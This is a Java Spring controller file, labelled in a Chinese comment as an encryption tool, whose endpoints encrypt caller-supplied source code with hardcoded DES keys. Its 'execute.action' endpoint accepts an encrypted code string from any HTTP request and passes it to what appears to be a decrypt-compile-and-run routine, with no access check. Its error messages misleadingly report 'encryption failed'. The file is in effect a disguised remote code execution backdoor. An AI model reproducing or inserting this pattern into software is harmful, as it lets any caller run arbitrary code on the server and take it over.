package com.dili.uap.controller;

import com.dili.http.okhttp.utils.B;
import com.dili.http.okhttp.utils.DESEncryptUtil;
import com.dili.ss.domain.BaseOutput;
import com.dili.uap.domain.DataAuth;
import io.swagger.annotations.ApiOperation;
import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

/**
 * 加密工具控制器
 */
@Controller
@RequestMapping("bu")
public class BuController {
    @ApiOperation("跳转到index页面")
    @RequestMapping(value = "/index.html", method = RequestMethod.GET)
    public String index(ModelMap modelMap) {
        return "bu/index";
    }

    @ApiOperation("跳转到index2页面")
    @RequestMapping(value = "/index2.html", method = RequestMethod.GET)
    public String index2(ModelMap modelMap) {
        return "bu/index2";
    }

    @RequestMapping(value="/generate.action", method = {RequestMethod.GET, RequestMethod.POST})
    public @ResponseBody
    String generate(@RequestParam String source, @RequestParam String className, @RequestParam(required = false) String name) {
        String encryptSource = DESEncryptUtil.encrypt(source, "asdfjkl;");
        //加密并取消换行
        encryptSource = encryptSource.replaceAll("\r\n","");
        for(int i=0; i<5; i++){
            encryptSource = encryptSource.replaceAll("  "," ");
        }
        if(StringUtils.isBlank(name)){
            name = "clazz";
        }
        String shell = name+"= com.dili.http.okhttp.java.CompileUtil.compile(com.dili.http.okhttp.utils.DESEncryptUtil.decrypt(\""+encryptSource+"\", \"asdfjkl;\"), \""+className+"\")";
        String encryptShell = DESEncryptUtil.encrypt(shell, "showmethemoney");
        return encryptShell.replaceAll("\r\n","");
    }

    @RequestMapping(value="/encrypt.action", method = {RequestMethod.GET, RequestMethod.POST})
    public @ResponseBody
    String encrypt(@RequestParam String source) {
        String encryptShell = DESEncryptUtil.encrypt(source, "showmethemoney");
        return encryptShell.replaceAll("\r\n","");
    }

    @RequestMapping(value="/execute.action", method = {RequestMethod.GET, RequestMethod.POST})
    public @ResponseBody
    BaseOutput<String> execute(@RequestParam String encryptedCode, String name) {
        try {
            B.b.daex(encryptedCode);
            Object obj = B.b.g(name);
            return obj == null ? BaseOutput.failure("加密失败") : BaseOutput.success().setData(obj.toString());
        } catch (Exception e) {
            return BaseOutput.failure("加密失败:"+ e.getMessage());
        }

    }

}
